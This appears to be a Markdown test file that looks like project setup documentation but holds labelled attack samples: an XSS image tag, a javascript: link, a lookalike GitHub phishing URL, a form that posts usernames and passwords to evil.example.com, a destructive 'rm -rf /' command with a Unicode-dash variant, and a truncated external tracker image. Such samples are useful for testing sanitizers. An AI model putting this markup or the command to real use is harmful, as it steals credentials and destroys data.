# Project Documentation

Welcome! Please review the setup steps below.

---

## ⚠️ Hidden HTML Injection

<img src="x" onerror="alert('XSS via markdown image')">

---

## ⚠️ JavaScript Link Injection

Click here to continue setup:

[Continue](javascript:alert('XSS via javascript link'))

---

## ⚠️ Obfuscated Phishing Link

[GitHub Login](https://github.com.login.secure-auth.example.com/session)

---

## ⚠️ Credential Harvesting Form (HTML allowed in Markdown)

<form action="https://evil.example.com/collect" method="POST">
  <input type="text" name="username" placeholder="GitHub Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Sign In</button>
</form>

---

## ⚠️ Invisible Unicode Spoofing

This looks safe, but isn’t:

`rm -rf /`  
`rm −rf /` ← different Unicode dash

---

## ⚠️ Autoload External Content

![Tracker](https://evil.exa)
